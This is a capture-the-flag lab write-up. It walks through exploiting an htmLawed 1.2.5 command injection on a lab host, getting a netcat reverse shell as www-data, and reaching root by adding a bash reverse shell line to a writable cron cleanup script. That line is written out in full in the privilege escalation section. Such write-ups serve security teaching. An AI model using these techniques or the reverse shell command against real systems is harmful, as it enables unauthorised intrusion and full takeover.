CTF-200-03

Target IP: 192.168.193.190
Challenge Description: N/A.

Reconnaissance


There are two TCP ports open on the target machine: SSH and HTTP, as shown above.


Performing an aggressive port scan against the two open TCP ports returns the result above. I will start enumeration with the HTTP application on port 80.

Enumeration

Port 80: HTTP

The webpage above is displayed for this web application. The application name & version HTMLAWED 1.2.5 is provided to me.


Doing a Google search for htmlawed 1.2.5 exploits lead me to the awesome article above. This article also contains the PoC to exploit this software.


I tried the same thing against the target machine by executing the command id and changing the hook to exec.


But the error webpage above is returned to me. The code is not executed by the target machine. The article I found mentioned one way to solve this vulnerability is to remove the htmLawedTest.php. Has this been fixed?

Exploitation


Using Burpsuite, I intercepted the request again. It looks like the POST request is sent to /htmLawedTest.php, as shown above. What happens if I remove this from the POST?


And bingo! The target machine successfully executed the command id as shown above. To achieve this, I had to remove the /htmLawedTest.php at line one of request.


Gaining a foothold was pretty simple. I started a listener on my machine at port 80. I used the nc reverse shell code above. I also had to change the hook to exec. Then using Burpsuite, I intercepted the request and removed the /htmLawedTest.php from line one. And after submitting the request, I obtained a reverse shell connection from the target machine on my machine at port 80 as shown above. Now I have a foothold on the target machine with the session as www-data.

Privilege Escalation


At /var/www, I notice the interesting script with the name cleanup.sh above.


The content of cleanup.sh is shown above. This script is responsible for removing the entries from the error.log and access.log files located at /var/log/apache2 as shown above. Is this a cronjob? I have the privileges to change it.


I inserted my bash reverse shell /bin/bash -i >& /dev/tcp/192.168.45.235/8443 0>&1 inside the cleanup.sh as shown above. Then I started a listener on my machine at port 8443. And after some time, I obtained a reverse shell connection with the session as root. Now I have a root shell on the target machine by exploiting the cleanup.sh cronjob.
